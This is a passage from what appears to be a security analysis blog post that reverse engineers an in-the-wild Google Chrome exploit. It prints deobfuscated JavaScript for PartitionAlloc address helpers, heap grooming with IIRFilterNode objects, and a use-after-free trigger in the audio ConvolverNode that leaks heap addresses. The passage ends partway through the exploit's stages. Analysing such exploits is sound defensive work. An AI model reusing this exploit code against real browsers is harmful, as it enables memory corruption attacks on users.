<p>The exploit code was obfuscated, but we were able to fully reverse engineer it and reveal all the small details. By looking at the code, we can see the author of the exploit has excellent knowledge of the internals of specific Google Chrome components, especially the <a href="https://github.com/scrapy/base-chromium/blob/master/allocator/partition_allocator/PartitionAlloc.md">PartitionAlloc</a> memory allocator. This can clearly be seen from the snippets of reverse engineered code below. These functions are used in the exploit to retrieve useful information from internal structures of the allocator, including: SuperPage address, PartitionPage address by index inside the SuperPage, the index of the used PartitionPage and the address of PartitionPage metadata. All constants are taken from <a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/partition_alloc_constants.h">partition_alloc_constants.h</a>:</p>
		<div id="crayon-676241da675d1179336102" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function getSuperPageBase(addr) {
	let superPageOffsetMask = (BigInt(1) &lt;&lt; BigInt(21)) - BigInt(1);
	let superPageBaseMask = ~superPageOffsetMask;
	let superPageBase = addr &amp; superPageBaseMask;
	return superPageBase;
}
 
function getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) {
	let superPageBase = getSuperPageBase(addr);
	let partitionPageBase = partitionPageIndex &lt;&lt; BigInt(14);
	let finalAddr = superPageBase + partitionPageBase;
	return finalAddr;
}
 
function getPartitionPageIndex(addr) {
	let superPageOffsetMask = (BigInt(1) &lt;&lt; BigInt(21)) - BigInt(1);
	let partitionPageIndex = (addr &amp; superPageOffsetMask) &gt;&gt; BigInt(14);
	return partitionPageIndex;
}
 
function getMetadataAreaBaseFromPartitionSuperPage(addr) {
	let superPageBase = getSuperPageBase(addr);
	let systemPageSize = BigInt(0x1000);
	return superPageBase + systemPageSize;
}
 
function getPartitionPageMetadataArea(addr) {
	let superPageOffsetMask = (BigInt(1) &lt;&lt; BigInt(21)) - BigInt(1);
	let partitionPageIndex = (addr &amp; superPageOffsetMask) &gt;&gt; BigInt(14);
	let pageMetadataSize = BigInt(0x20);
	let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize;
	return partitionPageMetadataPtr;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675d1179336102-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-2">2</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-4">4</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-6">6</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-8">8</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-10">10</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-12">12</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-14">14</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-16">16</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-18">18</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-20">20</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-22">22</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-24">24</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-26">26</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-28">28</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-30">30</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d1179336102-32">32</div><div class="crayon-num" data-line="crayon-676241da675d1179336102-33">33</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675d1179336102-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getSuperPageBase</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-2"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageOffsetMask</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">21</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-3"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageBaseMask</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">~</span><span class="crayon-i">superPageOffsetMask</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-4"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">addr</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; superPageBaseMask;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-5"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">superPageBase</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-6"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-7"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-8"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getPartitionPageBaseWithinSuperPage</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">partitionPageIndex</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-9"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getSuperPageBase</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-10"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">partitionPageBase</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">partitionPageIndex</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">14</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-11"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">finalAddr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-i">partitionPageBase</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-12"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">finalAddr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-13"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-14"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d1179336102-15"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getPartitionPageIndex</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-16"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageOffsetMask</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">21</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-17"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">partitionPageIndex</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; superPageOffsetMask) &gt;&gt; BigInt(14);</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-18"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">partitionPageIndex</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-19"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-20"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d1179336102-21"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getMetadataAreaBaseFromPartitionSuperPage</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-22"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getSuperPageBase</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-23"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">systemPageSize</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x1000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-24"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-i">systemPageSize</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-25"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-26"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d1179336102-27"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getPartitionPageMetadataArea</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-28"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">superPageOffsetMask</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">21</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-29"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">partitionPageIndex</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; superPageOffsetMask) &gt;&gt; BigInt(14);</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-30"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">pageMetadataSize</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x20</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-31"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">partitionPageMetadataPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getMetadataAreaBaseFromPartitionSuperPage</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e ">partitionPageIndex *</span><span class="crayon-h"> </span><span class="crayon-i">pageMetadataSize</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d1179336102-32"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">partitionPageMetadataPtr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d1179336102-33"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
It&#8217;s interesting that the exploit also uses the relatively new built-in <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt">BigInt</a> class to handle 64-bit values; authors usually use their own primitives in exploits.</p>
<p>At first, the code initiates OfflineAudioContext and creates a huge number of IIRFilterNode objects that are initialized via two float arrays.</p>
		<div id="crayon-676241da675d2871552707" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let gcPreventer = [];
let iirFilters = [];
 
function initialSetup() {
	let audioCtx = new OfflineAudioContext(1, 20, 3000);
 
	let feedForward = new Float64Array(2);
	let feedback = new Float64Array(1);
 
	feedback[0] = 1;
	feedForward[0] = 0;
	feedForward[1] = -1;
 
	for (let i = 0; i &lt; 256; i++)
        iirFilters.push(audioCtx.createIIRFilter(feedForward, feedback));
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675d2871552707-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-2">2</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-4">4</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-6">6</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-8">8</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-10">10</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-12">12</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-14">14</div><div class="crayon-num" data-line="crayon-676241da675d2871552707-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d2871552707-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675d2871552707-1"><span class="crayon-e">let </span><span class="crayon-i">gcPreventer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-2"><span class="crayon-e">let </span><span class="crayon-i">iirFilters</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d2871552707-3"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-4"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">initialSetup</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d2871552707-5"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">audioCtx</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">OfflineAudioContext</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-6"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d2871552707-7"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">feedForward</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Float64Array</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-8"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">feedback</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Float64Array</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d2871552707-9"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-10"><span class="crayon-h">	</span><span class="crayon-i">feedback</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d2871552707-11"><span class="crayon-h">	</span><span class="crayon-i">feedForward</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-12"><span class="crayon-h">	</span><span class="crayon-i">feedForward</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span>-<span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d2871552707-13"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-14"><span class="crayon-h">	</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">256</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span>++<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675d2871552707-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">iirFilters</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createIIRFilter</span><span class="crayon-sy">(</span><span class="crayon-i">feedForward</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">feedback</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d2871552707-16"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
After that, the exploit begins the initial stage of exploitation and tries to trigger a UAF bug. For that to work the exploit creates the objects that are needed for the Reverb component. It creates another huge OfflineAudioContext object and two ConvolverNode objects – ScriptProcessorNode to start audio processing and AudioBuffer for the audio channel.</p>
		<div id="crayon-676241da675d4616661972" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
async function triggerUaF(doneCb) {
	let audioCtx = new OfflineAudioContext(2, 0x400000, 48000);
	let bufferSource = audioCtx.createBufferSource();
	let convolver = audioCtx.createConvolver();
	let scriptNode = audioCtx.createScriptProcessor(0x4000, 1, 1);
	let channelBuffer = audioCtx.createBuffer(1, 1, 48000);
 
	convolver.buffer = channelBuffer;
	bufferSource.buffer = channelBuffer;
 
	bufferSource.loop = true;
	bufferSource.loopStart = 0;
	bufferSource.loopEnd = 1;
 
	channelBuffer.getChannelData(0).fill(0);
 
	bufferSource.connect(convolver);
	convolver.connect(scriptNode);
	scriptNode.connect(audioCtx.destination);
 
	bufferSource.start();
 
	let finished = false;
 
	scriptNode.onaudioprocess = function(evt) {
    		let channelDataArray = new Uint32Array(evt.inputBuffer.getChannelData(0).buffer);
 
    		for (let j = 0; j &lt; channelDataArray.length; j++) {
        		if (j + 1 &lt; channelDataArray.length &amp;&amp; channelDataArray[j] != 0 &amp;&amp; channelDataArray[j + 1] != 0) {
            			let u64Array = new BigUint64Array(1);
            			let u32Array = new Uint32Array(u64Array.buffer);
            			u32Array[0] = channelDataArray[j + 0];
            			u32Array[1] = channelDataArray[j + 1];
 
            			let leakedAddr = byteSwapBigInt(u64Array[0]);
            			if (leakedAddr &gt;&gt; BigInt(32) &gt; BigInt(0x8000))
                			leakedAddr -= BigInt(0x800000000000);
             			let superPageBase = getSuperPageBase(leakedAddr);
 
	             		if (superPageBase &gt; BigInt(0xFFFFFFFF) &amp;&amp; superPageBase &lt; BigInt(0xFFFFFFFFFFFF)) {
                			finished = true;
                			evt = null;
 
                			bufferSource.disconnect();
                			scriptNode.disconnect();
                			convolver.disconnect();
 
                			setTimeout(function() {
                     			doneCb(leakedAddr);
                			}, 1);
 
                			return;
            			}
        		}
    		}
	};
 
	audioCtx.startRendering().then(function(buffer) {
    		buffer = null;
 
    		if (!finished) {
        	 	finished = true;
       	  	triggerUaF(doneCb);
    		}
	});
 
	while (!finished) {
    		convolver.buffer = null;
    		convolver.buffer = channelBuffer;
    		await later(100); // wait 100 millseconds
	}
};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
